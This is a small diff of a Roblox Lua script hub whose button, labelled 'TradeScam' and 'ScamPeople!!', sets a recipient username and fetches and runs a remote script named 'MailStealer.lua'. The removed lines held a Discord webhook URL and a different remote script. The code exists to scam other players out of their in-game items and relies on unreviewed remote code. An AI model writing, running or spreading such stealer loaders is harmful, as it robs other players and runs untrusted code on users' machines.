@@ -5,8 +5,7 @@
   local TradeScamSection = TradeScam:NewSection("TradeScam")
 
   TradeScamSection:NewButton("TradeScam", "ScamPeople!!", function()
- _G.Username = "jiegamingstido"; 
-_G.Webhook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"; -- Optional!
+_G.Username = "jiegamingstido"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/test.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Cat-Hub/main/MailStealer.lua"))() 
   end)
